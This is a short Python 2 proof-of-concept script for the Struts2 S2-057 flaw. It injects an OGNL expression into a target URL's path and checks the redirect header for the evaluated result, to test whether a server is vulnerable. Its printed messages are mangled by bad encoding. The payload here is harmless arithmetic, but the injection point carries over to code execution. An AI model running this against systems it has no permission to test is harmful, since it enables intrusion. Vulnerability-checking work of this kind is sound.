#-*-coding:utf-8-*-
# Author: Fplyth0ner
# ST2-057 Poc

import sys
import requests

url = sys.argv[1]
url_list = [i for i in url.split("/") if i != '']

payload = "${(65535+521)}"

payload = "/" + payload + "/"
num = 0
for str in url_list:
	num += 1
	if num == 1:
		nurl = str
		continue
	elif num == 2:
		nurl = nurl + "//" + str
		continue
	elif num == len(url_list):
		nurl = nurl + payload + str
		continue
	else:
		nurl = nurl + "/" + str
		continue

try:
	r = requests.head(nurl, stream=True).headers["Location"]
except:
	print "������ST2-057©����"
	exit()

if r.find("66056") != -1:
	print "����ST2-057©����"
else:
	print "������ST2-057©����"